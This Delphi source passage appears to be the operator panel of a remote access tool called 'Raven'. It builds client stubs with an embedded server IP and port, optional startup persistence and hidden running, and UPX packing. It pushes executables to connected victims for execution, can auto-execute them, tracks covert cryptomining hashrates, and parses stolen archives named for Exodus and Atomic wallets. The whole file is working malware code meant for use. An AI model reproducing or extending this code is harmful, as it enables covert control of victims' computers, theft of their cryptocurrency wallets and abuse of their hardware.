            if Assigned(RunExecute) and (RunExecute.CurrentSocket = Socket) then
            begin
              if StatusParts[0] = 'IDLE' then
                RunExecute.LabelStatus.Caption := 'Status: IDLE'
              else if StatusParts[0] = 'STARTING' then
                RunExecute.LabelStatus.Caption := 'Status: STARTING...'
              else if StatusParts[0] = 'RUNNING' then
              begin
                if Length(StatusParts) > 1 then
                  Hashrate := StatusParts[1] + ' MH/s'
                else
                  Hashrate := 'Unknown';
                RunExecute.LabelStatus.Caption := 'Status: RUNNING (' + Hashrate + ')';
              end
              else if StatusParts[0] = 'STOPPING' then
                RunExecute.LabelStatus.Caption := 'Status: STOPPING...'
              else if StatusParts[0] = 'ERROR' then
                RunExecute.LabelStatus.Caption := 'Status: ERROR';
            end;

            RefreshClientListDisplay;
          end;
        except
          on E: Exception do
          begin
            Log('Error parsing mining status: ' + E.Message);
            if Assigned(RunExecute) and (RunExecute.CurrentSocket = Socket) then
              RunExecute.LabelStatus.Caption := 'Status: Parse Error';
          end;
        end;
      end;

      'P':
      begin
        if Assigned(RunExecute) and (RunExecute.CurrentSocket = Socket) then
        begin
          if A = 'SUCCESS' then
            RunExecute.Label1.Caption := 'GPU Settings: Applied'
          else
            RunExecute.Label1.Caption := 'GPU Settings: Failed';
        end;
      end;

      else
        Log(Format('Unknown command from %s: %s', [C.NickName, Cmd]));
    end;
  except
    on E: Exception do
      Log(Format('Error processing client data: %s', [E.Message]));
  end;
end;

procedure TForm2.SetupListView;

begin


end;


function GetDefaultCountryMapping: TDictionary<string, Integer>;
var
  CountryMap: TDictionary<string, Integer>;
begin
  CountryMap := TDictionary<string, Integer>.Create;


  CountryMap.Add('AU', 0);  // Australia
  CountryMap.Add('AT', 1);  // Austria
  CountryMap.Add('CA', 2);  // Canada
  CountryMap.Add('CN', 3);  // China
  CountryMap.Add('CZ', 4);  // Czech Republic
  CountryMap.Add('FI', 5);  // Finland
  CountryMap.Add('FR', 6);  // France
  CountryMap.Add('DE', 7);  // Germany
  CountryMap.Add('GB', 8);  // United Kingdom
  CountryMap.Add('HK', 9);  // Hong Kong
  CountryMap.Add('HU', 10); // Hungary
  CountryMap.Add('IT', 11); // Italy
  CountryMap.Add('LU', 12); // Luxembourg
  CountryMap.Add('MX', 13); // Mexico
  CountryMap.Add('NG', 14); // Nigeria
  CountryMap.Add('PL', 15); // Poland
  CountryMap.Add('RO', 16); // Romania
  CountryMap.Add('RU', 17); // Russia
  CountryMap.Add('ES', 18); // Spain
  CountryMap.Add('CH', 20); // Switzerland
  CountryMap.Add('TR', 21); // Turkey
  CountryMap.Add('US', 22); // USA

  Result := CountryMap;
end;

{ TFileMonitorThread }

constructor TFileMonitorThread.Create(AListView: TListView; const ALogFolder: string);
begin
  inherited Create(True);
  FreeOnTerminate := True;

  FListView := AListView;
  FLogFolder := ALogFolder;
  FFileList := TList<TFileInfo>.Create;
  FCountryCache := TDictionary<string, TCountryInfo>.Create;
  FLastScanTime := 0;
end;

destructor TFileMonitorThread.Destroy;
begin
  FFileList.Free;
  FCountryCache.Free;
  inherited;
end;
procedure TFileMonitorThread.Execute;

begin

end;

function TFileMonitorThread.GetCountryFromIP(const IP: string): TCountryInfo;
var
  HTTP: TIdHTTP;
  JSONValue: TJSONValue;
  CountryCode: string;
  ResponseStr: string;
  SSLHandler: TIdSSLIOHandlerSocketOpenSSL;
begin
  Result.CountryCode := 'XX';
  Result.FlagIndex := 23;

  // Skip IP lookup for local IPs
  if (IP = '127.0.0.1') or (IP = 'localhost') or
     (Pos('192.168.', IP) = 1) or (Pos('10.', IP) = 1) then
    Exit;

  HTTP := TIdHTTP.Create(nil);
  SSLHandler := TIdSSLIOHandlerSocketOpenSSL.Create(HTTP);
  try
    HTTP.IOHandler := SSLHandler;
    SSLHandler.SSLOptions.SSLVersions := [sslvTLSv1, sslvTLSv1_1, sslvTLSv1_2];

    HTTP.ConnectTimeout := 2000;
    HTTP.ReadTimeout := 2000;

    try
      ResponseStr := HTTP.Get('http://ip-api.com/json/' + IP + '?fields=countryCode');

      JSONValue := TJSONObject.ParseJSONValue(ResponseStr);
      try
        if Assigned(JSONValue) and (JSONValue is TJSONObject) then
        begin
          CountryCode := TJSONObject(JSONValue).GetValue<string>('countryCode');
          Result.CountryCode := CountryCode;
          Result.FlagIndex := GetFlagIndex(CountryCode);
        end;
      finally
        JSONValue.Free;
      end;
    except

    end;
  finally
    SSLHandler.Free;
    HTTP.Free;
  end;
end;

function TFileMonitorThread.GetFlagIndex(const CountryCode: string): Integer;
var
  CountryMap: TDictionary<string, Integer>;
  FlagIndex: Integer;
begin
  CountryMap := GetDefaultCountryMapping;
  try
    if CountryMap.TryGetValue(CountryCode, FlagIndex) then
      Result := FlagIndex
    else
      Result := 23;
  finally
    CountryMap.Free;
  end;
end;

function TFileMonitorThread.ParseFileName(const FileName: string): TFileInfo;
var
  Parts: TArray<string>;
  CleanName: string;
  I, Count: Integer;
  CurrentPart: string;
  Separator: string;
begin

  CleanName := StringReplace(FileName, '.zip', '', [rfIgnoreCase]);


  Separator := '-';
  Count := 0;
  SetLength(Parts, 5);

  I := 1;
  while I <= Length(CleanName) do
  begin
    CurrentPart := '';
    while (I <= Length(CleanName)) and (CleanName[I] <> Separator) do
    begin
      CurrentPart := CurrentPart + CleanName[I];
      Inc(I);
    end;

    if Count < Length(Parts) then
      Parts[Count] := CurrentPart;

    Inc(Count);
    Inc(I);
  end;

  Result.FileName := FileName;


  if Length(Parts) >= 1 then
    Result.IP := Parts[0];

  if Length(Parts) >= 2 then
    Result.Username := Parts[1];

  if Length(Parts) >= 3 then
    Result.Exodus := Parts[2];

  if Length(Parts) >= 4 then
    Result.Atomic := Parts[3];

  if Length(Parts) >= 5 then
    Result.WalletExt := Parts[4];
end;

procedure TFileMonitorThread.UpdateListView;

begin


end;

procedure TForm2.LDblClick(Sender: TObject);
var
  FullText: string;
  IPAddress: string;
  SpacePos: Integer;
begin
  if L.ItemIndex = -1 then Exit;


  FullText := L.Items[L.ItemIndex];


  SpacePos := Pos(' ', FullText);


  if SpacePos > 0 then
    IPAddress := Copy(FullText, 1, SpacePos - 1)
  else
    IPAddress := FullText;


  RunExecute := TRunExecute.Create(Application);
  RunExecute.CurrentSocket := TDzSocket(L.Items.Objects[L.ItemIndex]);
  RunExecute.Label1.Caption := IPAddress;
  RunExecute.Show;
end;




procedure TForm2.UpdateClientMiningStatus(Socket: TDzSocket; Status: TClientMiningStatus; const Hashrate: string = '');
var
  ClientInfo: TClientInfo;
begin
  ClientInfo := FindClientInfo(Socket);
  if Assigned(ClientInfo) then
  begin
    ClientInfo.MiningStatus := Status;
    if Hashrate <> '' then
      ClientInfo.Hashrate := Hashrate;
    ClientInfo.LastUpdate := Now;

    // Refresh the listbox display
    L.Invalidate;
  end;
end;

procedure TForm2.SetClientMiningStatus(Socket: TDzSocket; const StatusStr: string);
var
  StatusParts: TArray<string>;
  Status: TClientMiningStatus;
  Hashrate: string;
begin
  StatusParts := StatusStr.Split(['|']);

  if Length(StatusParts) > 0 then
  begin
    if StatusParts[0] = 'IDLE' then
    begin
      Status := cmIdle;
      Hashrate := '0.00 MH/s';
    end
    else if StatusParts[0] = 'STARTING' then
    begin
      Status := cmStarting;
      Hashrate := 'Starting...';
    end
    else if StatusParts[0] = 'RUNNING' then
    begin
      Status := cmRunning;
      if Length(StatusParts) > 1 then
        Hashrate := StatusParts[1] + ' MH/s'
      else
        Hashrate := 'Unknown';
    end
    else if StatusParts[0] = 'STOPPING' then
    begin
      Status := cmStopping;
      Hashrate := 'Stopping...';
    end
    else
    begin
      Status := cmError;
      Hashrate := 'Error';
    end;

    UpdateClientMiningStatus(Socket, Status, Hashrate);
  end;
end;


function TForm2.FindClientInfo(Socket: TDzSocket): TClientInfo;
var
  i: Integer;
begin
  Result := nil;
  if not Assigned(FClientList) then Exit;

  for i := 0 to FClientList.Count - 1 do
  begin
    if FClientList[i].Socket = Socket then
    begin
      Result := FClientList[i];
      Break;
    end;
  end;
end;

procedure TForm2.LDrawItem(AIndex: Integer; AState: TOwnerDrawState;
  ACanvas: TCanvas; ARect: TRect);
var
  ClientInfo: TClientInfo;
  TextRect: TRect;
  IconRect: TRect;
  StatusText: string;
  StatusColor: TColor;
begin
  // Find client info using the form's method
  ClientInfo := FindClientInfo(TDzSocket(L.Items.Objects[AIndex]));

 

  ACanvas.FillRect(ARect);

  // Set text color
  if odSelected in AState then
    ACanvas.Font.Color := clWhite
  else
    ACanvas.Font.Color := clWhite;

  // Draw client name
  TextRect := ARect;
  TextRect.Right := TextRect.Right - 80; // Leave space for mining status
  ACanvas.TextRect(TextRect, TextRect.Left + 4, TextRect.Top + 4, L.Items[AIndex]);

  // Draw mining status if we have client info
  if Assigned(ClientInfo) then
  begin
    IconRect := ARect;
    IconRect.Left := IconRect.Right - 76;
    IconRect.Right := IconRect.Right - 4;

    // Set status text and color based on mining status
    case ClientInfo.MiningStatus of
      cmIdle:
      begin
        StatusText := 'IDLE';
        StatusColor := clGray;
      end;
      cmStarting:
      begin
        StatusText := 'START';
        StatusColor := clBlue;
      end;
      cmRunning:
      begin
        StatusText := 'MINING';
        StatusColor := clGreen;
      end;
      cmStopping:
      begin
        StatusText := 'STOP';
        StatusColor := RGB(255, 165, 0); // Orange color
      end;
      cmError:
      begin
        StatusText := 'ERROR';
        StatusColor := clRed;
      end;
    end;

    // Draw status background
    ACanvas.Brush.Color := StatusColor;
    ACanvas.Pen.Color := StatusColor;
    ACanvas.RoundRect(IconRect.Left, IconRect.Top + 2, IconRect.Right, IconRect.Bottom - 2, 4, 4);

    // Draw status text
    ACanvas.Font.Color := clWhite;
    ACanvas.Font.Style := [fsBold];
    ACanvas.Font.Size := 7;
    ACanvas.Brush.Style := bsClear;

    ACanvas.TextRect(IconRect, IconRect.Left + 2, IconRect.Top + 5, StatusText);

    // Reset canvas
    ACanvas.Brush.Style := bsSolid;
    ACanvas.Font.Style := [];
    ACanvas.Font.Size := 8;
  end;
end;


procedure TForm2.ListView1CustomDrawSubItem(Sender: TCustomListView;
  Item: TListItem; SubItem: Integer; State: TCustomDrawState;
  var DefaultDraw: Boolean);
  var
  Canvas: TCanvas;
  SubItemRect: TRect;
begin
     Canvas := (Sender as TListView).Canvas;


  case SubItem of
    0: Canvas.Brush.Color := $E0FFE0;
    1: Canvas.Brush.Color := $FFE0E0;
    else Canvas.Brush.Color := $E0E0FF;
  end;

  // Use different text colors if needed
  if SubItem = 1 then
    Canvas.Font.Color := clBlue;

  DefaultDraw := True;
end;

procedure TForm2.scGPButton10Click(Sender: TObject);
begin
   try


  S.AutoFreeObjs := True;

   S.EnumeratorOnlyAuth := True;
  S.Port := StrToInt(scEdit3.Text);
  Label15.Caption :=  scEdit3.Text;
  S.Open;

  scGPButton10.Enabled := false;
  scGPButton11.Enabled := true;

  Label22.Caption := 'Online:' +  scEdit3.Text

       except
             on E: Exception do
    MessageBox(Handle, PWideChar('Failed To Listening : ' + scEdit3.Text + #13#10 + 'Error: ' + E.Message),
               'Information', MB_ICONERROR or MB_OK);
       end;
end;

procedure TForm2.scGPButton11Click(Sender: TObject);
begin

try



  S.Close;


  L.Clear;




   scGPButton11.Enabled := false;
scGPButton10.Enabled := true;
      Label15.Caption :=  '0';
      Label4.Caption := '0';
Label22.Caption := 'Offline'
except
 on E: Exception do
       MessageBox(Handle, PWideChar('Failed : ' + scEdit3.Text + #13#10 + 'Error: ' + E.Message),
               'Information', MB_ICONERROR or MB_OK);
end;

end;

procedure TForm2.scGPButton12Click(Sender: TObject);
var
  OpenDialog: TOpenDialog;
  FileStream: TFileStream;
  ByteArray: TBytes;
  Base64Str: string;
  FileName: string;

begin


  OpenDialog := TOpenDialog.Create(Self);
  try
    OpenDialog.Title := 'Select file to upload and execute';
    OpenDialog.Filter := 'Executable files (*.exe)|*.exe|All files (*.*)|*.*';

    if OpenDialog.Execute then
    begin

      FileName := ExtractFileName(OpenDialog.FileName);

      try

        FileStream := TFileStream.Create(OpenDialog.FileName, fmOpenRead);
        try
          // Check file size
          if FileStream.Size > 50 * 1024 * 1024 then
          begin
            MessageBox(Handle, 'File is too large. Maximum size is 50 MB.',
                       'Error', MB_ICONERROR or MB_OK);
            Exit;
          end;


          SetLength(ByteArray, FileStream.Size);
          FileStream.ReadBuffer(ByteArray[0], FileStream.Size);


          Base64Str := TNetEncoding.Base64.EncodeBytesToString(ByteArray);



          S.SendAll('U', FileName + '|' + Base64Str);

          MessageBox(Handle, PChar('File "' + FileName + '" sent to client.'),
                     'Upload Success', MB_ICONINFORMATION or MB_OK);
        finally
          FileStream.Free;
        end;
      except
        on E: Exception do
          MessageBox(Handle, PChar('Error sending file: ' + E.Message),
                     'Error', MB_ICONERROR or MB_OK);
      end;
    end;
  finally
    OpenDialog.Free;
  end;
end;

procedure TForm2.scGPButton13Click(Sender: TObject);
var
  OpenDialog: TOpenDialog;
begin

 OpenDialog := TOpenDialog.Create(Self);
  try
    OpenDialog.Title := 'Select file to upload and execute Automation';
    OpenDialog.Filter := 'Executable files (*.exe)|*.exe|All files (*.*)|*.*';
    if OpenDialog.Execute then
    begin
      scEdit4.Text := OpenDialog.FileName;
    end;
  finally
    OpenDialog.Free;
  end;

end;

procedure TForm2.scGPButton1Click(Sender: TObject);
begin
     scGPPageControl1.TabIndex := 1;
end;

procedure TForm2.scGPButton2Click(Sender: TObject);
begin
 scGPPageControl1.TabIndex := 0;
end;

procedure TForm2.scGPButton4Click(Sender: TObject);
begin
 scGPPageControl1.TabIndex := 3;
end;

procedure TForm2.scGPButton5Click(Sender: TObject);
var
  FileName: string;
  FileStream: TStringList;
  i: Integer;
  RandomStr: string;
  TimeStamp: string;
begin

  Randomize;
  TimeStamp := FormatDateTime('yyyymmddhhnnss', Now);
  RandomStr := IntToStr(Random(10000));
  FileName := 'Export_' + TimeStamp + '_' + RandomStr + '.txt';


  FileStream := TStringList.Create;
  try

    for i := 0 to L.Items.Count - 1 do
    begin
      FileStream.Add(L.Items[i]);
    end;


    FileStream.SaveToFile(ExtractFilePath(ParamStr(0)) + FileName);


    ShowMessage('List exported successfully to: ' + FileName);
  finally

    FileStream.Free;
  end;
end;

procedure TForm2.scGPButton6Click(Sender: TObject);
begin
 scGPPageControl1.TabIndex := 4;
end;

procedure TForm2.scGPButton7Click(Sender: TObject);
begin
 if MessageDlg('Warning: Clearing the list will remove all connected users. ' +
                'You will need to stop and restart the server to reconnect users. ' +
                'Are you sure you want to continue?',
                mtWarning, [mbYes, mbNo], 0) = mrYes then
  begin
    L.Clear;
  end;
end;


procedure TForm2.scGPButton8Click(Sender: TObject);
begin
 scGPPageControl1.TabIndex := 5;
end;

function GetRandomString(Size: Integer): string;
var
  i: Integer;
  RandStr: string;
begin
  RandStr := '';
  Randomize;

  for i := 1 to Size do
  begin

    case Random(3) of
      0: RandStr := RandStr + Char(Ord('A') + Random(26));
      1: RandStr := RandStr + Char(Ord('a') + Random(26));
      2: RandStr := RandStr + Char(Ord('0') + Random(10));
    end;
  end;

  Result := RandStr;
end;
procedure TForm2.scGPButton9Click(Sender: TObject);
var
  StubPath, TempStubPath: string;
  ResHandle: THandle;
  FileStream: TFileStream;
  IPData, PortData, StartupData, HiddenData: TBytes;
begin







  try

    StubPath := ExtractFilePath(Application.ExeName) + 'RavenOriginalStub.exe';

    TempStubPath := ExtractFilePath(Application.ExeName) + GetRandomString(32) + '.exe';


    if not FileExists(StubPath) then
    begin
      ShowMessage('Error: Stub.exe not found at: ' + StubPath);
      Exit;
    end;


    try
      CopyFile(PChar(StubPath), PChar(TempStubPath), False);
    except
      on E: Exception do
      begin
        ShowMessage('Failed to copy stub: ' + E.Message);
        Exit;
      end;
    end;


    IPData := TEncoding.UTF8.GetBytes(scEdit1.Text);
    PortData := TEncoding.UTF8.GetBytes(scEdit2.Text);


    if scGPSwitch2.State = scswOn then
      StartupData := TEncoding.UTF8.GetBytes('1');

    if scGPSwitch3.State = scswOn then
      HiddenData := TEncoding.UTF8.GetBytes('1');


    ResHandle := BeginUpdateResource(PChar(TempStubPath), False);
    if ResHandle = 0 then
    begin
      ShowMessage('Failed to open stub for resource updating. Error: ' + IntToStr(GetLastError));
      Exit;
    end;

    try

      if not UpdateResource(ResHandle, 'CUSTOM', 'SERVER_IP',
                          MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                          @IPData[0], Length(IPData)) then
      begin
        ShowMessage('Failed to update IP resource. Error: ' + IntToStr(GetLastError));
        Exit;
      end;

      if not UpdateResource(ResHandle, 'CUSTOM', 'SERVER_PORT',
                         MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                         @PortData[0], Length(PortData)) then
      begin
        ShowMessage('Failed to update Port resource. Error: ' + IntToStr(GetLastError));
        Exit;
      end;


      if scGPSwitch2.State = scswOn then
      begin
        if not UpdateResource(ResHandle, 'CUSTOM', 'STARTUP',
                           MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                           @StartupData[0], Length(StartupData)) then
        begin
          ShowMessage('Failed to update STARTUP resource. Error: ' + IntToStr(GetLastError));
          Exit;
        end;
      end;


      if scGPSwitch3.State = scswOn then
      begin
        if not UpdateResource(ResHandle, 'CUSTOM', 'HIDDEN',
                           MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                           @HiddenData[0], Length(HiddenData)) then
        begin
          ShowMessage('Failed to update HIDDEN resource. Error: ' + IntToStr(GetLastError));
          Exit;
        end;
      end;


      if not EndUpdateResource(ResHandle, False) then
      begin
        ShowMessage('Failed to commit resource updates. Error: ' + IntToStr(GetLastError));
        Exit;
      end;


        if scGPComboBox1.ItemIndex = 0 then
begin

end
else
begin

    var UPXPath: string := ExtractFilePath(Application.ExeName) + 'upx32.exe';
    var CmdParams: string := '--best --compress-exports=1 "' + TempStubPath + '"';


    if FileExists(UPXPath) then
    begin

        if ShellExecute(0, 'open', PChar(UPXPath), PChar(CmdParams), nil, 0) <= 32 then
            MessageBoxA(0, 'Failed to run UPX packer', 'Error', MB_ICONERROR)
        else
            Application.MessageBox(
  PChar('Stub has been successfully Packed with UPX: '  + TempStubPath),
  'Success',
  MB_OK + MB_ICONINFORMATION
);
    end
    else
        MessageBoxA(0, 'UPX packer (upx32.exe) not found in application directory', 'Error', MB_ICONERROR);
end;



Application.MessageBox(
  PChar('Stub has been successfully created with IP: ' +
        scEdit1.Text + ' and Port: ' + scEdit2.Text + 'Path: ' + TempStubPath),
  'Success',
  MB_OK + MB_ICONINFORMATION
);
    except
      on E: Exception do
      begin

        EndUpdateResource(ResHandle, TRUE);
        ShowMessage('Error during resource update: ' + E.Message);
      end;
    end;
  except
    on E: Exception do
      ShowMessage('Error creating stub: ' + E.Message);
  end;
end;

procedure TForm2.scGPSwitch4ChangeState(Sender: TObject);
begin

 if scEdit4.Text = 'File Path' then
 begin
   MessageBoxA(0, 'Please Choose File Before You Enable Auto Executions', 'Auto', 0);
   Exit;
 end;



if scGPSwitch4.State = scswOn then
begin
AutoExec.Enabled := true;
Application.MessageBox(
  PChar('Auto Execution Started: ' + 'Path: ' + scEdit4.Text),
  'Success',
  MB_OK + MB_ICONINFORMATION
);
end;

if scGPSwitch4.State = scswOff then
begin
AutoExec.Enabled := false;
     Application.MessageBox(
  PChar('Auto Execution Stopped: ' + 'Path: ' + scEdit4.Text),
  'Success',
  MB_OK + MB_ICONINFORMATION
);
end;


end;

procedure TForm2.StartMonitoring;

begin

end;

procedure TForm2.mytimeanddateTimer(Sender: TObject);
begin
 Label8.Caption := FormatDateTime('mm-dd-yyyy', Now);


Label9.Caption := FormatDateTime('hh:nn:ss AM/PM', Now);
end;

procedure TForm2.WMNCHitTest(var Msg: TWMNCHitTest);
begin
  inherited;
  if Msg.Result = HTCLIENT then
    Msg.Result := HTCAPTION;
end;

end.
